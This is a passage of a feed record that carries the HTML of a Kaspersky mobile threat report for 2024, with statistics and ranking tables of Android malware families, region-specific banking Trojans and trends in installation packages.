dictionaries to search the gallery on the device for images to exfiltrate. Our data suggests that the Trojan was aimed at stealing recovery phrases for cryptocurrency wallets of Android users primarily in the UAE, Europe and Asia.</p>\n<p>It is worth noting that the same implant for iOS was delivered via the App Store, which makes it the first known OCR malware to sneak into Apple&#8217;s official marketplace. Apple removed the infected apps in February 2025.</p>\n<h2 id=\"mobile-threat-statistics\">Mobile threat statistics</h2>\n<p>We discovered 1,133,329 malicious and potentially unwanted installation packages in 2024. This was below the 2023 figure, but the difference was smaller than the year before. The trend in the number of new unique malware installation packages appears to be plateauing.</p>\n<div class=\"js-infogram-embed\"></div>\n<p><em>Detected Android-specific malware and unwanted software installation packages in 2021\u20132024 (<a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14152715/02-all-mobile-report-2024.png\" rel=\"noopener\" target=\"_blank\">download</a>)</em></p>\n<h3 id=\"detected-packages-by-type\">Detected packages by type</h3>\n<div class=\"js-infogram-embed\"></div>\n<p><em>Detected mobile apps by type in 2023 and 2024 (<a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14153024/03-en-mobile-report-2024.png\" rel=\"noopener\" target=\"_blank\">download</a>)</em></p>\n<p>Adware and RiskTool apps continued to dominate the rankings of detected threats by type. The BrowserAd (22.8%), HiddenAd (20.3%) and Adlo (16%) families accounted for the largest number of new installation packages in the former category. RiskTool&#8217;s share grew largely due to an increase in the number of Fakapp pornographic apps.</p>\n<div class=\"js-infogram-embed\"></div>\n<p><em>Share* of users attacked by the given type of malware or unwanted software out of all targeted Kaspersky mobile users in 2023\u20132024 (<a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14153505/04-en-mobile-report-2024.png\" rel=\"noopener\" target=\"_blank\">download</a>)</em></p>\n<p>*The total may exceed 100% if the same users experienced multiple attack types.</p>\n<p>Banking Trojans gained three positions as compared with 2023 to occupy fourth place, following the usual leaders: adware, Trojans, and RiskTool.</p>\n<h3 id=\"top-20-most-frequently-detected-types-of-mobile-malware\">TOP\u00a020 most frequently detected types of mobile malware</h3>\n<p><em>Note that the malware rankings below exclude riskware and potentially unwanted apps, such as adware and RiskTool.</em></p>\n<table>\n<tbody>\n<tr>\n<td><strong>Verdict</strong></td>\n<td><strong>%* 2023</strong></td>\n<td><strong>%* 2024</strong></td>\n<td><strong>Difference in p.p.</strong></td>\n<td><strong>Change in ranking</strong></td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Fakemoney.v</td>\n<td>11.76</td>\n<td>16.64</td>\n<td>+4.88</td>\n<td>+2</td>\n</tr>\n<tr>\n<td>DangerousObject.Multi.Generic.</td>\n<td>14.82</td>\n<td>11.13</td>\n<td>\u20133.70</td>\n<td>\u20131</td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Triada.ga</td>\n<td>0.00</td>\n<td>6.64</td>\n<td>+6.64</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Mamont.bc</td>\n<td>0.00</td>\n<td>5.36</td>\n<td>+5.36</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Boogr.gsh</td>\n<td>6.81</td>\n<td>4.71</td>\n<td>\u20132.10</td>\n<td>\u20133</td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Triada.fd</td>\n<td>1.16</td>\n<td>4.45</td>\n<td>+3.29</td>\n<td>+19</td>\n</tr>\n<tr>\n<td>DangerousObject.AndroidOS.GenericML</td>\n<td>2.39</td>\n<td>4.35</td>\n<td>+1.96</td>\n<td>+3</td>\n</tr>\n<tr>\n<td>Trojan-Downloader.AndroidOS.Dwphon.a</td>\n<td>0.77</td>\n<td>3.59</td>\n<td>+2.82</td>\n<td>+26</td>\n</tr>\n<tr>\n<td>Trojan-Spy.AndroidOS.SpyNote.bz</td>\n<td>0.43</td>\n<td>3.40</td>\n<td>+2.97</td>\n<td>+48</td>\n</tr>\n<tr>\n<td>Trojan-Spy.AndroidOS.SpyNote.bv</td>\n<td>0.37</td>\n<td>2.69</td>\n<td>+2.32</td>\n<td>+57</td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Fakeapp.hk</td>\n<td>0.00</td>\n<td>2.51</td>\n<td>+2.51</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Triada.gs</td>\n<td>0.00</td>\n<td>2.50</td>\n<td>+2.50</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Triada.gn</td>\n<td>0.00</td>\n<td>2.02</td>\n<td>+2.02</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Downloader.AndroidOS.Agent.mm</td>\n<td>1.46</td>\n<td>1.91</td>\n<td>+0.45</td>\n<td>+6</td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Triada.gm</td>\n<td>0.00</td>\n<td>1.84</td>\n<td>+1.84</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Generic.</td>\n<td>3.63</td>\n<td>1.83</td>\n<td>\u20131.80</td>\n<td>\u20138</td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Fakemoney.bw</td>\n<td>0.00</td>\n<td>1.82</td>\n<td>+1.82</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Agent.rj</td>\n<td>0.00</td>\n<td>1.63</td>\n<td>+1.63</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Fakemoney.bj</td>\n<td>0.00</td>\n<td>1.61</td>\n<td>+1.61</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Spy.AndroidOS.SpyNote.cc</td>\n<td>0.06</td>\n<td>1.54</td>\n<td>+1.47</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p><strong><em>* Share of unique users who encountered this malware as a percentage of all attacked Kaspersky mobile users</em></strong></p>\n<p>Fakemoney, a family of investment and payout scam apps, showed the highest level of activity in 2024. Third-party WhatsApp mods with the Triada.ga embedded Trojan were third, following the generalized cloud-specific verdict of DangerousObject.Multi.Generic. Many other messaging app mods in the same family, namely Triada.fd, Triada.gs, Triada.gn and Triada.gm, hit the TOP 20 too.</p>\n<p>Mamont banking Trojans, ranking fourth by number of attacked users, gained high popularity with cybercriminals. These malicious apps come in a multitude of variants. They typically target users&#8217; funds via SMS or USSD requests. One of them spreads under the guise of a parcel tracking app for fake online stores.</p>\n<p>Various malware files detected by machine learning technology ranked fifth (Trojan.AndroidOS.Boogr.gsh) and seventh (DangerousObject.AndroidOS.GenericML). They were followed by the <a href=\"https://securelist.com/crimeware-report-android-malware/112121/\" rel=\"noopener\" target=\"_blank\">Dwphon Trojan</a> that came preinstalled on certain devices. The SpyNote RAT Trojans, which remained active throughout the year, occupied ninth, tenth and twentieth places.</p>\n<h3 id=\"region-specific-malware\">Region-specific malware</h3>\n<p>This section describes malware types that mostly affected specific countries.</p>\n<table>\n<tbody>\n<tr>\n<td><strong>Verdict</strong></td>\n<td><strong>Country*</strong></td>\n<td><strong>%**</strong></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Agent.nw</td>\n<td>Turkey</td>\n<td>99.58</td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Piom.axdh</td>\n<td>Turkey</td>\n<td>99.58</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.BrowBot.q</td>\n<td>Turkey</td>\n<td>99.18</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.BrowBot.w</td>\n<td>Turkey</td>\n<td>99.15</td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Piom.bayl</td>\n<td>Turkey</td>\n<td>98.72</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.BrowBot.a</td>\n<td>Turkey</td>\n<td>98.67</td>\n</tr>\n<tr>\n<td>Trojan-Spy.AndroidOS.SmsThief.wp</td>\n<td>India</td>\n<td>98.63</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Rewardsteal.fa</td>\n<td>India</td>\n<td>98.33</td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Piom.bbfv</td>\n<td>Turkey</td>\n<td>98.31</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.BrowBot.n</td>\n<td>Turkey</td>\n<td>98.14</td>\n</tr>\n<tr>\n<td>HackTool.AndroidOS.FakePay.c</td>\n<td>Brazil</td>\n<td>97.99</td>\n</tr>\n<tr>\n<td>Backdoor.AndroidOS.Tambir.d</td>\n<td>Turkey</td>\n<td>97.87</td>\n</tr>\n<tr>\n<td>Trojan.AndroidOS.Piom.bcqp</td>\n<td>Turkey</td>\n<td>97.79</td>\n</tr>\n<tr>\n<td>HackTool.AndroidOS.FakePay.i</td>\n<td>Brazil</td>\n<td>97.65</td>\n</tr>\n<tr>\n<td>Backdoor.AndroidOS.Tambir.a</td>\n<td>Turkey</td>\n<td>97.62</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Coper.b</td>\n<td>Turkey</td>\n<td>97.45</td>\n</tr>\n<tr>\n<td>HackTool.AndroidOS.FakePay.h</td>\n<td>Brazil</td>\n<td>97.39</td>\n</tr>\n<tr>\n<td>Trojan-Spy.AndroidOS.SmsThief.ya</td>\n<td>India</td>\n<td>97.09</td>\n</tr>\n<tr>\n<td>Trojan-Spy.AndroidOS.SmsThief.wm</td>\n<td>India</td>\n<td>97.09</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Rewardsteal.hi</td>\n<td>India</td>\n<td>96.68</td>\n</tr>\n</tbody>\n</table>\n<p><strong><em>*\u00a0Country where the malware was most active</em></strong><br />\n<strong><em>*\u00a0Share of unique users who encountered the malware in the indicated country as a percentage of all Kaspersky mobile security users attacked by the malware</em></strong></p>\n<p>Turkey and India accounted for the majority of region-specific threats in 2024. A variety of banking Trojans continued to be active in Turkey. Piom Trojans were associated with GodFather and BrowBot banker campaigns.</p>\n<p>Users in India were attacked by Rewardsteal bankers and a variety of SmsThief SMS spies. Our quarterly reports have covered FakePay utilities widespread in Brazil and designed to defraud sellers by imitating payment transactions.</p>\n<h3 id=\"mobile-banking-trojans\">Mobile banking Trojans</h3>\n<p>The number of new banking Trojan installation packages dropped again to 68,730 as compared to the previous year.</p>\n<div class=\"js-infogram-embed\"></div>\n<p><em>The number of mobile banking Trojan installation packages detected by Kaspersky in 2021\u20132024 (<a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/14160333/05-all-mobile-report-2024.png\" rel=\"noopener\" target=\"_blank\">download</a>)</em></p>\n<p>The total number of banker attacks increased dramatically over 2023&#8217;s level despite the drop in the number of unique installation packages. The trend has persisted for years. This may suggest that scammers began to scale down their efforts to generate unique applications, focusing instead on distributing the same files to a maximum number of victims.</p>\n<h4 id=\"top-10-mobile-bankers\">TOP 10 mobile bankers</h4>\n<table>\n<tbody>\n<tr>\n<td><strong>Verdict</strong></td>\n<td><strong>%* 2023</strong></td>\n<td><strong>%* 2024</strong></td>\n<td><strong>Difference in p.p.</strong></td>\n<td><strong>Change in ranking</strong></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Mamont.bc</td>\n<td>0.00</td>\n<td>36.70</td>\n<td>+36.70</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Agent.rj</td>\n<td>0.00</td>\n<td>11.14</td>\n<td>+11.14</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Mamont.da</td>\n<td>0.00</td>\n<td>4.36</td>\n<td>+4.36</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Coper.a</td>\n<td>0.51</td>\n<td>3.58</td>\n<td>+3.07</td>\n<td>+30</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.UdangaSteal.b</td>\n<td>0.00</td>\n<td>3.17</td>\n<td>+3.17</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Agent.eq</td>\n<td>21.79</td>\n<td>3.10</td>\n<td>\u201318.69</td>\n<td>\u20134</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Mamont.cb</td>\n<td>0.00</td>\n<td>3.05</td>\n<td>+3.05</td>\n<td></td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Bian.h</td>\n<td>23.13</td>\n<td>3.02</td>\n<td>\u201320.11</td>\n<td>\u20137</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Faketoken.z</td>\n<td>0.68</td>\n<td>2.96</td>\n<td>+2.29</td>\n<td>+18</td>\n</tr>\n<tr>\n<td>Trojan-Banker.AndroidOS.Coper.c</td>\n<td>0.00</td>\n<td>2.84</td>\n<td>+2.84</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p><strong><em>* Share of unique users who encountered this malware as a percentage of all users of Kaspersky mobile security solutions who encountered banking threats</em></strong></p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>The number of unique malware and unwanted software installation packages continued to decline year to year in 2024. However, the rate of that decline slowed down. The upward trend in mobile banking Trojan activity persisted despite the years-long decrease in unique installation packages.</p>\n<p>Cybercriminals kept trying to sneak malware into official app stores like Google Play, but we also discovered a fair number of diverse preinstalled malicious apps in 2024. Speaking of interesting techniques first spotted last year, the use of NFC for stealing bank card data stands out.</p>"
+                }
+            ],
+            "wfw_commentrss": "https://securelist.com/mobile-threat-report-2024/115494/feed/",
+            "slash_comments": "0",
+            "media_content": [
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/27111517/SL-mobile-report-2024-featured.jpg",
+                    "width": "2000",
+                    "height": "1000"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/27111517/SL-mobile-report-2024-featured-1024x512.jpg",
+                    "width": "1024",
+                    "height": "512"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/27111517/SL-mobile-report-2024-featured-300x150.jpg",
+                    "width": "300",
+                    "height": "150"
+                },
+                {
+                    "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/03/27111517/SL-mobile-report-2024-featured-150x150.jpg",
+                    "width": "150",
+                    "height": "150"
+                }
+            ],
+            "media_keywords": "thumbnail"
         }
     ]
 }
